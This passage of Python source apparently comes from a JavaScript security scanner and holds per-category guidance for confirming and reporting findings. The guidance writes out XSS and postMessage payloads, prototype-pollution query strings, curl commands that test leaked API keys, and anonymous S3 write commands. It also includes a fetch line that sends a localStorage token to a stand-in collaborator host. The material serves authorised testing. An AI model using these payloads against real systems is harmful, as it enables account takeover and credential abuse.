                             "then with a different user's identifiers. The finding is "
                             "whatever it returns that it should not.")

        for m in TEMPLATE_ENDPOINT_RE.finditer(self.content):
            path = re.sub(r"\$\{[^}]*\}", "{param}", m.group(1))
            if "{param}" in path:
                agg.setdefault("endpoints", set()).add(path)

        for m in GRAPHQL_OP_RE.finditer(self.content):
            agg.setdefault("graphql_ops", set()).add(m.group(1))

        for m in WS_RE.finditer(self.content):
            agg.setdefault("websockets", set()).add(m.group(1))

        for m in EMAIL_RE.finditer(self.content):
            value = m.group(0)
            if value.lower().endswith((".png", ".jpg", ".svg", ".js", ".css")):
                continue
            agg.setdefault("emails", set()).add(value)

        for m in FEATUREFLAG_RE.finditer(self.content):
            agg.setdefault("feature_flags", set()).add(m.group(0).strip()[:60])

        for m in FULLURL_RE.finditer(self.content):
            agg.setdefault("urls", set()).add(m.group(0))


# ─────────────────────────────────────────────────────────────────────────────
#  Per-category guidance
# ─────────────────────────────────────────────────────────────────────────────
# What the category means, how to confirm it, and what the report needs. Kept
# here rather than on each finding so the wording is consistent and one place
# has to be edited when the advice changes.

CATEGORY_GUIDANCE = {
    "Exposed Credential": (
        "WHAT IT IS: a credential that has no business being in a file the browser "
        "downloads. Anyone who views source has it.\n"
        "CONFIRM IT: use it. AWS — `aws sts get-caller-identity` with the key "
        "configured. Stripe — `curl https://api.stripe.com/v1/balance -u <key>:`. "
        "GitHub — `curl -H 'Authorization: token <key>' https://api.github.com/user`. "
        "SendGrid — `curl -H 'Authorization: Bearer <key>' "
        "https://api.sendgrid.com/v3/scopes`. Slack — `curl -H 'Authorization: Bearer "
        "<key>' https://slack.com/api/auth.test`. A JWT — decode it and check `exp` "
        "and the claims.\n"
        "STOP THERE: one authenticated read is proof. Do not enumerate, download or "
        "modify anything.\n"
        "REPORT: the file URL and position, a redacted key, the single API response "
        "showing it authenticates, and what it grants. Tell the client to rotate "
        "first and remove second — removing it from the bundle does not un-leak it."),

    "Client Configuration Key": (
        "WHAT IT IS: a key that is supposed to be in the page. Reporting these as "
        "leaked credentials is the fastest way to lose a client's confidence.\n"
        "CONFIRM THE MISCONFIGURATION INSTEAD:\n"
        "  Google API key — call a billable API with no Referer: "
        "`curl 'https://maps.googleapis.com/maps/api/geocode/json?address=x&key=KEY'`. "
        "A 200 from an unknown origin means no referrer or API restriction, which is "
        "billing abuse.\n"
        "  Firebase config — `curl https://PROJECT.firebaseio.com/.json` for open "
        "read; try a PATCH for open write; and test self-signup with "
        "`identitytoolkit.googleapis.com/v1/accounts:signUp?key=KEY`, which is the "
        "usual real-world path in.\n"
        "  Algolia — introspect the key's ACL: `curl -H 'X-Algolia-Application-Id: APP' "
        "-H 'X-Algolia-API-Key: KEY' https://APP-dsn.algolia.net/1/keys/KEY`. "
        "search-only is expected; addObject/deleteIndex/settings is critical.\n"
        "  Mapbox — `curl 'https://api.mapbox.com/tokens/v2?access_token=TOKEN'` and "
        "read the scopes; any *:write scope is a finding.\n"
        "  Supabase anon key — query a table over REST; data coming back means row "
        "level security is off.\n"
        "REPORT: title it after the misconfiguration, not the key. 'Unrestricted "
        "Google Maps API key permits billing abuse' — not 'API key disclosure'."),

    "DOM XSS — source reaches sink": (
        "WHAT IT IS: attacker-controllable data reaching a sink that executes script "
        "or parses HTML, in the same neighbourhood of code.\n"
        "CONFIRM IT: put a unique harmless token in the source — for a hash source, "
        "load the page with `#zqxj9134` — then search the live DOM in the Elements "
        "panel, not view-source, for that token. Where it lands tells you the "
        "context. Break out from that context: `\"><img src=x onerror=alert(document"
        ".domain)>` in an attribute, `'-alert(document.domain)-'` inside a JS string, "
        "`<svg onload=alert(document.domain)>` in HTML text, `javascript:alert(1)` in "
        "a navigation sink. innerHTML will not run a bare <script> — use an event "
        "handler attribute.\n"
        "IF IT WILL NOT FIRE: set a breakpoint on the sink and step the value; a "
        "sanitiser or an encode in between is the answer, and that is worth writing "
        "down as 'not exploitable because…'.\n"
        "REPORT: the exact URL that triggers it, a screenshot of the alert, the "
        "source and sink with their positions, and the impact in terms of what an "
        "attacker reads or does as the victim."),

    "DOM sink — needs manual triage": (
        "WHAT IT IS: a dangerous sink with no attacker-controlled source found near "
        "it. This is inventory, not a vulnerability, and it is listed separately so "
        "it never lands in a report by accident.\n"
        "TRIAGE IT: breakpoint the sink, use the app normally, and look at what "
        "arrives. Data that came from the server is 'stored DOM XSS' and needs a "
        "write primitive first; a template literal built from constants is nothing.\n"
        "REPORT: only after you have a source. Otherwise leave it out."),

    "postMessage — no origin validation": (
        "WHAT IT IS: a message handler that acts on data from any origin. Any page "
        "that can frame the target or hold a window handle can drive it.\n"
        "CONFIRM IT: host a page that frames the target and posts to it:\n"
        "  <iframe src=https://target/page id=f onload=\"setInterval(()=>f.content"
        "Window.postMessage({type:'render',html:'<img src=x onerror=alert(document."
        "domain)>'},'*'),300)\"></iframe>\n"
        "Watch the legitimate flow first with `window.addEventListener('message', "
        "e=>console.log(e.origin,e.data), true)` to learn the message schema, then "
        "replay it with a hostile field.\n"
        "REPORT: the attacker page, what the handler did with the message, and the "
        "impact — XSS if it reaches a sink, session theft if it reads storage."),

    "postMessage — weak origin validation": (
        "WHAT IT IS: an origin check that a hostname an attacker can register will "
        "satisfy. indexOf and includes match anywhere in the string; startsWith lets "
        "through example.evil.com; endsWith lets through notexample.com; an "
        "unanchored regex matches anything containing the pattern.\n"
        "CONFIRM IT: work out a hostname that passes the specific check, host the "
        "attacker page there, and post the message. Also try the `null` origin — a "
        "sandboxed iframe or a data: URL — which several checks fall through on.\n"
        "REPORT: quote the check verbatim, name the hostname that defeats it, and "
        "show the handler acting on your message."),

    "postMessage — sent to wildcard origin": (
        "WHAT IT IS: postMessage(data, '*') delivers to whatever origin currently "
        "occupies the target window.\n"
        "CONFIRM IT: open the page from an attacker origin (window.open or an "
        "iframe), listen for messages, and capture what arrives. The finding is what "
        "is in the payload.\n"
        "REPORT: informational unless the payload carries tokens or personal data, "
        "in which case it is a disclosure to any site that can open the page."),

    "postMessage — origin checked": (
        "Informational — the handler does compare event.origin. Read the comparison "
        "yourself; a check that looks strict can still be wrong, and this detector "
        "only confirms that one exists."),

    "Prototype pollution surface": (
        "WHAT IT IS: code that writes to an object using a key from data, which can "
        "reach Object.prototype and change behaviour application-wide.\n"
        "CONFIRM POLLUTION FIRST: load the page with `?__proto__[testpp]=polluted`, "
        "then `?constructor[prototype][testpp]=polluted`, and check "
        "`Object.prototype.testpp` in the console. Try the hash as well as the query "
        "string, and any JSON body or postMessage the app merges. Apps that block one "
        "notation usually miss the other.\n"
        "THEN FIND A GADGET: pollution on its own is weak. Pollute a property the app "
        "or its libraries read — hitCallback and sequence (Google Analytics and Tag "
        "Manager, which reach setTimeout and eval), cspNonce and srcdoc, jQuery's "
        "$.ajax options, DOMPurify's ALLOWED_ATTR — and re-trigger the flow. Burp's "
        "DOM Invader automates both halves.\n"
        "REPORT: the pollution vector, the gadget, and the resulting script execution "
        "as one chain. Pollution with no gadget is a low-severity finding at best."),

    "Client-side authorisation check": (
        "WHAT IT IS: the front end deciding what a user may do. It is a statement of "
        "intent, and it is the best list you will get of what to test server-side.\n"
        "CONFIRM IT: take the endpoint the check guards and call it directly in Burp "
        "— unauthenticated, then as the lowest-privilege account you hold, then with "
        "another user's object identifiers. Flipping the flag in DevTools proves the "
        "UI changes; it proves nothing about the server, so do both.\n"
        "REPORT: if the server returns the data or performs the action, that is "
        "broken access control and the JavaScript check is merely how you found it. "
        "If the server re-checks correctly, record it as defence in depth and move on."),

    "Session material in browser storage": (
        "WHAT IT IS: tokens or session identifiers in localStorage or sessionStorage, "
        "which any script on the origin can read.\n"
        "CONFIRM IT: read the value in the console and show it is a live credential — "
        "replay it against an API call.\n"
        "REPORT: on its own this is an informational hardening point. Chained with "
        "any XSS on the origin it is account takeover, so if you have one, "
        "demonstrate `fetch('//your-collab/?c='+localStorage.getItem('token'))` and "
        "report the pair together at the higher severity."),

    "Cloud storage reference": (
        "WHAT IT IS: a bucket or container named in client code.\n"
        "CONFIRM IT: anonymous read — `curl <url>`; anonymous list — "
        "`aws s3 ls s3://<bucket> --no-sign-request`; anonymous write — "
        "`aws s3 cp test.txt s3://<bucket>/ --no-sign-request`, and delete it "
        "afterwards. For Azure try `?restype=container&comp=list`. Also check whether "
        "the bucket name is unclaimed, which is a takeover.\n"
        "REPORT: the exact command, the listing or object returned, and what the data "
        "is. A writable bucket serving scripts to the app is critical — say so."),

    "Internal host disclosure": (
        "WHAT IT IS: internal addresses and hostnames shipped to the public.\n"
        "CONFIRM IT: check whether the host resolves and is reachable from outside. "
        "169.254.169.254 in particular is the cloud metadata endpoint and usually "
        "means something fetches a URL it was given.\n"
        "REPORT: on its own it is information disclosure and low severity. Its real "
        "value is as a target list for any SSRF you find."),

    "Source map reference": (
        "WHAT IT IS: a pointer to the original, unminified source.\n"
        "CONFIRM IT: fetch the .map. A 200 with a sourcesContent array is the whole "
        "original source tree. Reconstruct it — unwebpack-sourcemap, or "
        "`npx source-map-explorer` to see the module layout quickly.\n"
        "THEN READ IT: admin components that are never linked, endpoints with their "
        "real parameter names, the permission model, build-time environment variables "
        "(everything prefixed REACT_APP_ or NEXT_PUBLIC_ is in there), original "
        "comments, and a dependency list with versions for CVE lookup.\n"
        "REPORT: the map exposure as its own information-disclosure finding, and "
        "every vulnerability it led you to as a separate finding with its own proof."),

    "Sensitive endpoint referenced": (
        "WHAT IT IS: an administrative, internal or debug path named in client code. "
        "Often the front end never calls it for your role — but the server still "
        "answers.\n"
        "CONFIRM IT: request it unauthenticated, as a low-privilege user, and with "
        "method tampering (GET where the app uses POST, and the reverse). Compare "
        "responses.\n"
        "REPORT: the request and response showing data or functionality you should "
        "not have. That is broken access control, not information disclosure."),

    "Outdated library with known issues": (
        "WHAT IT IS: a dependency version with published advisories.\n"
        "CONFIRM IT: read the version at runtime rather than trusting the banner — "
        "jQuery.fn.jquery, React.version, angular.version.full. Then check the "
        "advisories for that exact release and test only the ones that match how this "
        "application uses the library.\n"
        "REPORT: never report a version number alone. Either demonstrate the issue or "
        "mark it explicitly as unverified version disclosure, at low severity."),

    "Weak cryptography": (
        "WHAT IT IS: a broken algorithm, or Math.random() where unpredictability "
        "matters.\n"
        "CONFIRM IT: find what the output is used for. MD5 on a cache key is not a "
        "finding. MD5 on a password, or Math.random() generating a token, reset code "
        "or nonce, is — and for Math.random() you can often predict subsequent values "
        "from observed ones.\n"
        "REPORT: the security decision that depends on the weak primitive, and a "
        "demonstration of a forged or predicted value if you can produce one."),

    "Debug or development artefact": (
        "WHAT IT IS: debug switches and development leftovers in a production bundle.\n"
        "CONFIRM IT: try to turn it on — a query parameter, a localStorage key, a "
        "global variable — and watch for extra console output, verbose errors or "
        "hidden functionality.\n"
        "REPORT: low severity unless the debug mode discloses data or unlocks "
        "something, in which case report that instead."),

    "Revealing comment": (
        "WHAT IT IS: a developer note that survived the build.\n"
        "CONFIRM IT: read it, then test what it points at — an endpoint, a "
        "workaround, a disabled check, a known-broken behaviour.\n"
        "REPORT: quote it and pair it with whatever it led you to. A TODO on its own "
        "is not a finding."),
}


# ─────────────────────────────────────────────────────────────────────────────
#  Entry points
# ─────────────────────────────────────────────────────────────────────────────

def analyse(url: str, content: str, source_map=None, agg=None) -> list:
    """Analyse one file. Returns deduplicated findings, highest severity first."""
    scanner = JsScanner(url, content, source_map=source_map)
    return scanner.scan(agg)


def merge_findings(existing: list, new: list) -> list:
    """Combine per-file results, merging identical findings across files."""
    by_key = {}
    order = []
    for finding in existing + new:
        current = by_key.get(finding.key)
        if current is None:
            by_key[finding.key] = finding
            order.append(finding.key)
            continue
        current.count += finding.count
        room = MAX_LOCATIONS - len(current.locations)
        if room > 0:
            current.locations.extend(finding.locations[:room])
        if SEV_ORDER.get(finding.severity, 0) > SEV_ORDER.get(current.severity, 0):
            current.severity = finding.severity
    return [by_key[k] for k in order]


def is_minified(content: str) -> bool:
    lines = content.count("\n") + 1
    return (len(content) / max(1, lines)) > MINIFIED_AVG_LINE
